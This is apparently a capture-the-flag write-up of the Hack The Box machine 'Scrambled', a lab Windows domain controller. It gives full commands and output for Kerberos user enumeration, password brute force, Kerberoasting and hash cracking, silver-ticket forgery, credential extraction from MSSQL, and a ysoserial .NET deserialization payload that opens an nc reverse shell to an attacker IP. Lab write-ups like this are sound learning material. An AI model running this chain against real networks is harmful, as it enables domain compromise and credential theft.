---
title: "HTB - Scrambled"
date: 2023-03-11T18:37:33+01:00
draft: false
tags: [HTB, Medium, Windows, silver_ticket, ticketer, SPNs, GetUserSPNs, GetTGT, secretsdump, kerberos_only , disabled_NTLM, mssqlclient, kerbrute, ysoserial, deserialization, dotNET]
---

## Foothold
### Nmap
```
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
80/tcp open http Microsoft IIS httpd 10.0  
|_http-server-header: Microsoft-IIS/10.0  
|_http-title: Scramble Corp Intranet  
| http-methods:  
|_ Potentially risky methods: TRACE  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-19 22:07:25Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)  
|_ssl-date: 2022-08-19T22:10:31+00:00; 0s from scanner time.  
| ssl-cert: Subject: commonName=DC1.scrm.local  
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local  
| Not valid before: 2022-06-09T15:30:57  
|_Not valid after: 2023-06-09T15:30:57  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC1.scrm.local  
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local  
| Not valid before: 2022-06-09T15:30:57  
|_Not valid after: 2023-06-09T15:30:57  
|_ssl-date: 2022-08-19T22:10:31+00:00; 0s from scanner time.  
1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2022-08-19T12:42:00  
|_Not valid after: 2052-08-19T12:42:00  
|_ssl-date: 2022-08-19T22:10:31+00:00; 0s from scanner time.  
4411/tcp open found?  
| fingerprint-strings:  
| DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:  
| SCRAMBLECORP_ORDERS_V1.0.3;  
| FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:  
| SCRAMBLECORP_ORDERS_V1.0.3;  
|_ ERROR_UNKNOWN_COMMAND;  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
9389/tcp open mc-nmf .NET Message Framing  
49667/tcp open msrpc Microsoft Windows RPC  
49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
49674/tcp open msrpc Microsoft Windows RPC  
49700/tcp open msrpc Microsoft Windows RPC  
49704/tcp open msrpc Microsoft Windows RPC  
62080/tcp open msrpc Microsoft Windows RPC
```
Basic windows box, with one website, one mssql DB and a weird service on port 4411

One of the pages gives us some info:
1. a mail address: *support@scramblecorp.com*
2. a potential user on the machine: *ksimpson*

We also learn that NTLM is disabled and thus make kerberos auth the only way to auth against the server.

That implies that we cannot connect to the SMB server as guest user.
At least, we got the domain name and the servers FQDN: *scrm.local* and *d1.scrm.local*

Let's check if *ksimpson* is actually a domain user using [kerbrute]([https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute))

```  
> echo "ksimpson" > ksimpson.txt
> ../Downloads/kerbrute_linux_amd64 userenum --dc scrm.local --domain scrm.local ksimpson.txt  
  
__ __ __  
/ /_____ _____/ /_ _______ __/ /____  
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< / __/ / / /_/ / / / /_/ / /_/ __/  
/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/  
  
Version: v1.0.3 (9dad6e1) - 08/20/22 - Ronnie Flathers @ropnop  
  
2022/08/20 07:42:01 > Using KDC(s):  
2022/08/20 07:42:01 > scrm.local:88  
  
2022/08/20 07:42:01 > [+] VALID USERNAME: ksimpson@scrm.local  
2022/08/20 07:42:02 > Done! Tested 208 usernames (2 valid) in 0.712 seconds  
```
It is!

With a little bit of hope and a [word list generator]([https://github.com/Mebus/cupp](https://github.com/Mebus/cupp)) let's try to bruteforce the password of *ksimpson*. If the generated word list is not enough, we'll use *rockyou.txt*.

```  
> ../Downloads/kerbrute_linux_amd64 bruteuser --dc scrm.local --domain scrm.local ksimpson.txt ksimpson  
  
__ __ __  
/ /_____ _____/ /_ _______ __/ /____  
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< / __/ / / /_/ / / / /_/ / /_/ __/  
/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/  
  
Version: v1.0.3 (9dad6e1) - 08/20/22 - Ronnie Flathers @ropnop  
  
2022/08/20 07:44:42 > Using KDC(s):  
2022/08/20 07:44:42 > scrm.local:88  
  
2022/08/20 07:44:43 > [+] VALID LOGIN: ksimpson@scrm.local:ksimpson  
2022/08/20 07:44:43 > Done! Tested 127 logins (1 successes) in 1.585 seconds  
```
Nice! We got user *ksimpson* with password *ksimpson*, how original!

Since NTLM is disabled, we can't login with just an username and a password. Let's get a TGT for *ksimpson*:

```  
> impacket-getTGT -dc-ip scrm.local scrm.local/ksimpson:ksimpson  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
  
[*] Saving ticket in ksimpson.ccache  
  
> export KRB5CCNAME=ksimpson.ccache  
```

Now, the tricky part. 

Again, NTLM is disabled. This forces us to use our tools from impacket in a bit different way. A particular tool called `GetUserSPNs` gives us some trouble in it's usage.
In fact, using `GetUserSPNs` against a server using the `-k` option (the one to use kerberos auth) crashes if the server have NTLM auth disabled. Which is exactly our case.

After some research, I found this [GitHub issue](https://github.com/SecureAuthCorp/impacket/issues/1206) . It was opened by the author of the box, VbScrub. In one the comments of the issue, we retrieve a patch to the script made again by VbScrub. Let's try to see if it works now:

```  
> impacket-GetUserSPNs -dc-ip dc1.scrm.local scrm.local/ksimpson -request -k -no-pass  
  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
  
ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation  
---------------------------- ------ -------- -------------------------- -------------------------- ----------  
MSSQLSvc/dc1.scrm.local:1433 sqlsvc 2021-11-03 12:32:02.351452 2022-08-19 11:36:27.165001  
MSSQLSvc/dc1.scrm.local sqlsvc 2021-11-03 12:32:02.351452 2022-08-19 11:36:27.165001  
  
  
  
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$9fb10606d36c78f75369417734abee3a$6238bc62414b9150aa851219f5a9f2f59f98e5bd5fcf3e5806117a1637c4cc3cfed6bb27548321c7464c8837b4dabd2dc10022c991f8e6b7306372ce01973f80ddd03ecf9b7766c79584f48772863676aece2d48385c16f551f4cb8caf625376e4314c97a6145edf92536edbca3fe03e796653eded6c9982ca7ded92e21867ff52501f67611fcd81eef62a9848755cb9f94e4f9338cb6b5d871c158ef981a4162efbbc0995dffdd9dee1ce687ce67cd53661d081da33303f08eccc4dc83bb963af2ebb6e9bfd25f66880648c7face7b4f0d976e13e3181cfe480203a6aad896fa626296e0908b909a007e949f9ca971b5287fa941fcd52be0f401121374e6477fc95bb1167433d7bb4a67aa89e532bd08e51e7df25b6ab7226a89e45573639d36eaa934f00eb262813464705006c920bccd6b2d8badc9f7db13abc40f3a712ef60431c6f4c2fedcf479abdc318e30a2352c21318be9e971fca46acbc55725d72a1f272d95abf8030e986ce1e55563575a5489832076c46145163509ff9560776be4f44b5dedce58ed4111c93e52f3da9d1faed7fde6e80d09965cedf9dacfa4918fef23d04a8ad7a628b8828a72d7311b2e3381c508a4bd101cfcbf74425399f49b3917901332fc882253ccd84890cec248d1bd45c252aa6c5b375d62310438145291c48336b1c94ab0b546e6b9d5b5499c74be903022a3f0c4e5f43992dec8e3ea5b8dd3e66e2ec41a2344eddb386bc8ecce278621f3ae4afb7e30930b27cccbb94b4bda8de78d0a4e9050bd45eaa4cbfba6f43c26ad9566b8c676761ce75915b5d57a8fd1a4f8bf84d150581abbe2cd90830539e5dc1b8744a4c305323c0f209d2b06dafde1a7fe14b6f30ad0241c189eb4cd43c5764c476a87ea1f9fc4b9f106426f94e36fbdfebb5999bfb38fedc68c6f3d310a9caf7b295f9431c204aa46db6b599b431644e28e7fd369093d83c986d0c60413e8b9df06279c98ab48d8d8e7696443e7795a61b1d720cfa0906d77ea0428cb57ef552cffd1ba385c3c8b01a3a58730760cdb1f247d29af857aac740b2eb0ad25e57ff3e9841011dcf69e7a4eb8fdb25f4e4467ed43b677c5ba639ad31d1c5e4c21e64ccfa115c41e6269f45549d38c11aba92369a8c784077da4cae3d28e9845500ea3f68fdd6727e743a0c2c1a7b7b78cb1cd9d1a59a46bb14b2c1f159001e5bce68a1c1591671758c465682e8fc628610626f3abcf80c937de04dd4cf7b81540fc2f068f77447558a0080952f40ccedc6151447f61bbac12ef32c18eb6e79e144a7a0258382162bbe26eaa6be6e4cba312b59481428fd1a6b6397376ae562c3f492f4ba5701dbe0030cba26219d8a4cd6fd9d0be5a057d51f9cf0bc620e6ca935fda2f757323a04d2a83c5dd5658bf3d34a755e6b334b0be0d948570ef1f5b15c460761e1  
```
It does ! And we get a TGS ticket for the user `sqlsvc`. We can bruteforce it using JTR:

```  
> john --wordlist=/usr/share/wordlists/rockyou.txt sql_svc_hash  
  
Using default input encoding: UTF-8  
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
Will run 4 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
Pegasus60 (?)  
1g 0:00:00:11 DONE (2022-08-20 08:08) 0.08673g/s 930569p/s 930569c/s 930569C/s Penrose..Pearce  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.  
```
Okay, so we got *sqlsvc* password: *Pegasus60*. Nice !

After some unfortunate attempts to login to the *mssql* service (I forgot about NTLM being disabled and the fact that I needed a ticket to get the right to use the *mssql* service). I tried going back to the SMB service. Since NTLM is disabled, let's use `impacket-smbclient` instead of the normal `smbclient` :

```  
> impacket-smbclient -no-pass -k scrm.local/sqlsvc@dc1.scrm.local  
  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
  
Type help for list of commands  
#  
```  
Ok, we got a way in. Let's list available shares:  

```  
# shares  
  
ADMIN$  
C$  
HR  
IPC$  
IT  
NETLOGON  
Public  
Sales  
SYSVOL  
```  
Can't access _Sales_ share with this user, let's try _Public_  
  
```  
# use Public  
# ls  
  
drw-rw-rw- 0 Thu Nov 4 18:23:19 2021 .  
drw-rw-rw- 0 Thu Nov 4 18:23:19 2021 ..  
-rw-rw-rw- 630106 Fri Nov 5 13:45:07 2021 Network Security Changes.pdf  
# get Network Security Changes.pdf  
```

The contents of the PDF confirms that they're aware of NTLM relaying attack and thus disabled NTLM auth.
We also learn that they got credentials stolen from them inside an SQL database => Are the creds still inside ?  
They've removed all access to the SQL service for everyone apart from network admins => 
Getting a ticket for the mssql service will not be enough.
We can create a silver ticket for the *mssql* service for the *Administrator* user.

Since we have a clear path: Connecting to the DB to see if there still is some creds stored. Let's get this silver ticket. 
To achieve that, we'll need 3 info: 
- An SPN that we can use. We already have that, it's the `MSSQLSvc/dc1.scrm.local:1433` service.
- The domain SID.
- The NT hash of the user that will sign the ticket. In our case *sqlsvc*
- The user id for the user the ticket will be created for. In our case Administrator so: `500 Administrator`

### Domain SID
We can use `secretsdump` with debug enabled (`-d`) to dump the SID instead of manually doing an lsaquery with rpcclient.

```  
> impacket-secretsdump -k scrm.local/sqlsvc@dc1.scrm.local -no-pass -debug  
  
[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket  
[+] Using Kerberos Cache: sqlsvc.ccache  
[+] SPN CIFS/DC1.SCRM.LOCAL@SCRM.LOCAL not found in cache  
[+] AnySPN is True, looking for another suitable SPN  
[+] Returning cached credential for KRBTGT/SCRM.LOCAL@SCRM.LOCAL  
[+] Using TGT from cache  
[+] Trying to connect to KDC at SCRM.LOCAL  
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
[+] Session resume file will be sessionresume_uKHJCEUr  
[+] Trying to connect to KDC at SCRM.LOCAL  
[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500  
[+] Calling DRSGetNCChanges for {edaf791f-e75b-4711-8232-3cd66840032a}  
```
> don't forget to remove the last part of the outputted SID !  
  
domain SID: S-1-5-21-2743207045-1827831105-2542523200

### *sqlsvc* NT hash
We can use this [tool]([https://codebeautify.org/ntlm-hash-generator](https://codebeautify.org/ntlm-hash-generator)) to generate the hash:
`Pegasus60` => `B999A16500B87D17EC7F2E2A68778F05`

Okay, we've got everything we need to create our silver ticket. Let's use `impacket-ticketer` to create it.

```  
impacket-ticketer -domain scrm.local -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200  
  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
  
[*] Creating basic skeleton ticket and PAC Infos  
[*] Customizing ticket for scrm.local/Administrator  
[*] PAC_LOGON_INFO  
[*] PAC_CLIENT_INFO_TYPE  
[*] EncTicketPart  
[*] EncTGSRepPart  
[*] Signing/Encrypting final ticket  
[*] PAC_SERVER_CHECKSUM  
[*] PAC_PRIVSVR_CHECKSUM  
[*] EncTicketPart  
[*] EncTGSRepPart  
[*] Saving ticket in Administrator.ccache  
```

Let's use this ticket to connect to the *mssql* service using `mssqlclient`:

```
> export KRB5CCNAME=Administrator.ccache
> impacket-mssqlclient dc1.scrm.local -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>
```
> Don't forget to use the FQDN of the target (here, *dc1.scrm.local*) instead of just the domain name (*scrm.local*)

We're in !

## User
Let's find out if they removed the creds that were stolen by the attacker from the last time.  
  
```  
SQL> select name from sys.databases; # let's display all the DB inside MSSQL  
  
name  
--------------------------------------------------------------------------------------------------------------------------------  
master  
tempdb  
model  
msdb  
ScrambleHR  
  
SQL> use ScrambleHR;  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR  
[*] INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.  
  
SQL> select table_name from information_schema.TABLES;  
  
table_name  
--------------------------------------------------------------------------------------------------------------------------------  
Employees  
UserImport  
Timesheets  
  
SQL> select * from UserImport;  
  
LdapUser LdapPwd LdapDomain RefreshInterval IncludeGroups  
-------------------------------------------------- -------------------------------------------------- -------------------------------------------------- --------------- -------------  
MiscSvc ScrambledEggs9900 scrm.local 90 0  
```  
Nice we go the creds of _MiscSvc_ with the password _ScrambledEggs9900_  
  
We can use them to interact with DC1 :  
> Thx hAAAAAAAAAAAAAAAAtricks [https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#sudo](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#sudo)  
  
```  
$pass = ConvertTo-SecureString ‘ScrambledEggs9900’ -AsPlainText -Force  
$cred = New-Object System.Management.Automation.PSCredential("MiscSvc", $pass)  
  
Invoke-Command -Computer DC1 -ScriptBlock { whoami } -Credential $cred  
...  
```  
  
We got a revshell on *MiscSvc* and the user flag

## LPE
Upon entering the machine as *miscsvc*  we can see 2 files:

```  
PS C:\Users\miscsvc\Documents> ls  
Directory: C:\Users\miscsvc\Documents  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
-a---- 05/11/2021 20:52 86528 ScrambleClient.exe  
-a---- 05/11/2021 20:52 19456 ScrambleLib.dll  
```
Let's download them

ScrambleClient.exe is the client that we saw inside the website that connects to the port 4411. Everything connects.

Judging the output of `strings ScrambleClient.exe`, *ScrambleClient.exe* seems to be an *VB* app. *ScrambleLib.dll* however is a dynamic linked library that seems to be created with .NET

Using netcat on the machine at the 4411, it seems we can interact with it via sending orders like so: 

```
> nc  10.10.11.168 4411

SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;
ERROR_GENERAL;Error deserializing sales order: Attempting to deserialize an empty stream.
```
Wait *deserializing*... ? That's nice. let's find the function used to deserialize orders then !

```
> strings ScrambleLib.dll |grep seria   

DeserializeFromBase64
Deserialize
```

From this we can use this tool called [ysoserial](https://github.com/frohoff/ysoserial) and the .NET version since we're deserializing in .NET [ysoserial.net](https://github.com/pwntester/ysoserial.net) 

```
> nc -lnvp 4450
> .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Users\miscsvc\Documents\nc.exe 10.10.14.174 4450"

AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAgApBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBNEFVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1WMFkyRjBMbVY0WlNBdFpTQndiM2RsY25Ob1pXeHNJREV3TGpFd0xqRTBMakUzTkNBME5ETWlJRk4wWVc1a1lYSmtSWEp5YjNKRmJtTnZaR2x1WnowaWUzZzZUblZzYkgwaUlGTjBZVzVrWVhKa1QzVjBjSFYwUlc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVmMyVnlUbUZ0WlQwaUlpQlFZWE56ZDI5eVpEMGllM2c2VG5Wc2JIMGlJRVJ2YldGcGJqMGlJaUJNYjJGa1ZYTmxjbEJ5YjJacGJHVTlJa1poYkhObElpQkdhV3hsVG1GdFpUMGlZMjFrSWlBdlBnMEtJQ0FnSUNBZ1BDOXpaRHBRY205alpYTnpMbE4wWVhKMFNXNW1iejROQ2lBZ0lDQThMM05rT2xCeWIyTmxjM00rRFFvZ0lEd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlMazlpYW1WamRFbHVjM1JoYm1ObFBnMEtQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEkrQ3c9PQs=
```

And just with that we've got our admin access and root flag !


AAAAAAAAAAAAAAAA